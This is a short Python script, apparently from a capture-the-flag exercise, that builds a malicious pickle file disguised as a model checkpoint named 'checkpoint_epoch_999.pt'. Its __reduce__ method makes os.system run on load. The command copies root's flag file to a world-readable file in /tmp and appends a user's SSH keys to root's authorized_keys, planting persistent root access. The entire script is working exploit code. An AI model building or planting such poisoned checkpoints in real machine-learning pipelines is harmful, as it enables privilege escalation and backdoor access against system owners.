# make_ckpt.py
import pickle, os

class E:
    def __reduce__(self):
        cmd = (
            "cat /root/root.txt > /tmp/.rootflag; chmod 644 /tmp/.rootflag; "
            "mkdir -p /root/.ssh; "
            "cat /home/developer/.ssh/authorized_keys >> /root/.ssh/authorized_keys; "
            "chmod 600 /root/.ssh/authorized_keys"
        )
        return (os.system, (cmd,))

with open("checkpoint_epoch_999.pt", "wb") as f:
    pickle.dump(E(), f)

print("Created checkpoint_epoch_999.pt")
